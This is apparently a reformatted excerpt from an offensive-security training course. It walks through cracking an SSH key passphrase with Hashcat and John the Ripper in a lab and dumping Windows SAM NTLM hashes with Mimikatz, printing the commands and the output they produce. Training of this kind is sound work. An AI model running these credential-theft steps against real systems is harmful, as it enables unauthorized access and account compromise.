### SHA-2
Reference: [Wikipedia, 2022](https://en.wikipedia.org/wiki/SHA-2)

### Penetration Testing with Kali Linux
**PWK - Copyright Â© 2023 OffSec Services Limited. All rights reserved.**

#### Contents of the `ssh.rule` Rules File
Next, we will create a wordlist file containing the passwords from `note.txt` and save it as `ssh.passwords`.

```bash
kali@kali:~/passwordattacks$ cat ssh.passwords
Window
rickc137
dave
superdave
megadave
umbrella
```

#### Using Hashcat for Cracking
We can use Hashcat to perform the cracking by specifying the rules file, the wordlist, and the mode.

```bash
kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat (v6.2.5) starting...
Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
No hashes loaded.
```

#### Failed Cracking Attempt with Hashcat
Unfortunately, we receive an error indicating that our hash caused a "Token length exception." Research suggests that modern private keys and their corresponding passphrases are created with the `aes-256-ctr` cipher, which is not supported by Hashcat's mode 22921. This reinforces the benefit of using multiple tools, such as John the Ripper (JtR), which can handle this cipher.

To use the previously created rules in JtR, we need to add a name for the rules and append them to the `/etc/john/john.conf` configuration file. For this demonstration, we'll name the rule `sshRules` with a "List.Rules" rule naming syntax.

```bash
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

#### Cracking the Passphrase with JtR
Now that we've successfully added `sshRules` to the JtR configuration file, we can use `john` to crack the passphrase.

```bash
kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Umbrella137! (?)
1g 0:00:00:00 DONE (2022-05-30 11:19) 1.785g/s 32.14p/s 32.14yc/s 32.14C/s
Window137!..Umbrella137#
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We successfully cracked the private key passphrase! The password "Umbrella137!" satisfies the password policy requirements and matches the user's personal preferences and habits.

#### Connecting to the Target System via SSH
Now, let's use the passphrase to connect to the target system via SSH.

```bash
kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 PI:EMAIL
Enter passphrase for key 'id_rsa':
Welcome to Alpine!
The Alpine Wiki contains a large amount of how-to guides and general information about administrating Alpine systems.
See <URL>.
You can setup the system with the command: setup-alpine
You may change this message by editing /etc/motd.
0d6d28cfbd9c:~$
```

We successfully connected to the target system by providing the correct passphrase to the private key.

### Working with Password Hashes
This Learning Unit covers the following objectives:
- Obtain and crack NTLM hashes
- Pass NTLM hashes
- Obtain and crack Net-NTLMv2 hashes
- Relay Net-NTLMv2 hashes

In real-life penetration tests, we often gain privileged access to a system and can leverage these privileges to extract password hashes from the operating system. We can also make and intercept Windows network authentication requests and use them in further attacks like pass-the-hash or relay attacks.

While most assignments involve Active Directory environments, this Learning Unit focuses on local Windows machines. The skills learned here are a stepping stone to later Active Directory modules in this course.

#### Cracking NTLM Hashes
Before we begin cracking NTLM hashes, let's discuss the NTLM hash implementation and how it is used. Then, we'll demonstrate how to obtain and crack NTLM hashes in Windows.

Windows stores hashed user passwords in the Security Account Manager (SAM) database file, which is used to authenticate local or remote users. To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature in Windows NT 4.0 SP3, which partially encrypts the SAM file.

Passwords can be stored in two different hash formats: LAN Manager (LM) and NTLM. LM is based on DES and is known to be very weak. It is disabled by default beginning with Windows Vista and Windows Server 2008.

On modern systems, the hashes in the SAM are stored as NTLM hashes. This hash implementation addresses many weaknesses of LM. However, NTLM hashes stored in the SAM database are not salted.

Salts are random bits appended to a password before it is hashed. They are used to prevent precomputed hash attacks. A list or table of precomputed passwords is called a Rainbow Table, and the corresponding attack is called a Rainbow Table Attack.

We use "NTLM hash" to refer to the formally correct NTHash. Since "NTLM hash" is more commonly used in our industry, we use it in this course to avoid confusion.

#### Extracting NTLM Hashes with Mimikatz
We cannot copy, rename, or move the SAM database while the Windows operating system is running because the kernel keeps an exclusive file system lock on the file. Fortunately, we can use the Mimikatz tool to extract plain-text passwords and password hashes from various sources in Windows.

Mimikatz includes the `sekurlsa` module, which extracts password hashes from the Local Security Authority Subsystem (LSASS) process memory. LSASS handles user authentication, password changes, and access token creation. It caches NTLM hashes and other credentials, which we can extract using the `sekurlsa` Mimikatz module.

To extract passwords, we must run Mimikatz as Administrator and have the `SeDebugPrivilege` access right enabled. We can also elevate our privileges to the SYSTEM account with tools like PsExec or the built-in Mimikatz token elevation function.

#### Obtaining and Cracking NTLM Hashes
We'll retrieve passwords from the SAM of the `MARKETINGWK01` machine at `192.168.50.210`. We can log in to the system via RDP as user `offsec`, using `lab` as the password.

First, we'll check which users exist locally on the system using `Get-LocalUser`.

```powershell
PS C:\Users\offsec> Get-LocalUser
Name         Enabled Description
----         ------- -----------
Administrator False   Built-in account for administering the computer/domain
DefaultAccount False  A user account managed by the system.
Guest        False   Built-in account for guest access to the computer/domain
nelly        True
offsec       True
WDAGUtilityAccount False A user account managed and used by the system for Windows Defender Application Guard scen...
...
```

The output indicates the existence of another user named `nelly` on the `MARKETINGWK01` system. Our goal is to obtain `nelly`'s plain text password by retrieving the NTLM hash and cracking it.

We'll use Mimikatz to check for stored credentials on the system. Start PowerShell as administrator and navigate to the Mimikatz directory.

```powershell
PS C:\Windows\system32> cd C:\tools
PS C:\tools> ls
Directory: C:\tools
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 5/31/2022 12:25 PM 1355680 mimikatz.exe
PS C:\tools> .\mimikatz.exe
.#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
## \ / ## > https://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( PI:EMAIL )
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/
mimikatz #
```

According to the prompt, Mimikatz is running. We can interact with it through its command-line environment. Each command consists of a module and a command delimited by two colons, for example, `privilege::debug`.

We'll use `lsadump::sam` to extract the NTLM hashes from the SAM. First, we must elevate to SYSTEM user privileges with `token::elevate` and enable the `SeDebugPrivilege` access right with `privilege::debug`.

```bash
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
656 {0;000003e7} 1 D 34811 NT AUTHORITY\SYSTEM S-1-5-18
(04g,21p) Primary
-> Impersonated !
* Process Token : {0;000413a0} 1 F 6146616 MARKETINGWK01\offsec S-1-5-21-4264639230-2296035194-3358247000-1001 n(14g,24p) Primary
* Thread Token : {0;000003e7} 1 D 6217216 NT AUTHORITY\SYSTEM S-1-5-18
(04g,21p) Impersonation (Delegation)
mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264D639230-2296035194-3358247000
RID : 000003e9 (1001)
User : offsec
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
RID : 000003ea (1002)
User : nelly
Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
```

We successfully extracted the NTLM hashes for the users `offsec` and `nelly`.